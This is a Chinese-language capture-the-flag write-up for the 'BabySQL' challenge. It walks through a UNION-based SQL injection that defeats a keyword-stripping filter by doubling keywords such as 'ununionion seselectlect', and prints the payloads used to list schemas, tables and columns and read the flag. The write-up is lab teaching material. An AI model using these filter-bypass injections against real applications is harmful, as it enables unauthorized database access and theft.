# [极客大挑战 2019]BabySQL 1

- 直接尝试万能账号密码，但是均失败，发现网页中写了 `自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！` ，所以直接进行sql注入。首先判断字段数，但是发现or和by被过滤了

> <img src="../../IMG2/Screenshot 2024-05-20 200821.png">

- 我输入的是 `1' order by 3#` ，但是只显示了 `1' der 3#` ，说明or和by被过滤了，尝试双写，发现双写成功

> <img src="../../IMG2/Screenshot 2024-05-20 201014.png">

- 下面判断回显点，发现过滤了 `union` 和 `select` ，进行双写绕过

> <img src="../../IMG2/Screenshot 2024-05-20 201713.png">

- 确定回显点为2,3，下面获取数据库，发现 `information` 和 `from` 被过滤

`1' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#`

> <img src="../../IMG2/Screenshot 2024-05-20 202308.png">

- 发现ctf数据库，查询数据表

`1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'#`

> <img src="../../IMG2/Screenshot 2024-05-20 202553.png">

- 发现flag表，读字段

`1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf'#`

> <img src="../../IMG2/Screenshot 2024-05-20 202824.png">

- 发现flag字段，读取值

`1' ununionion seselectlect 1,2,flag ffromrom ctf.Flag#`

> <img src="../../IMG2/Screenshot 2024-05-20 202958.png">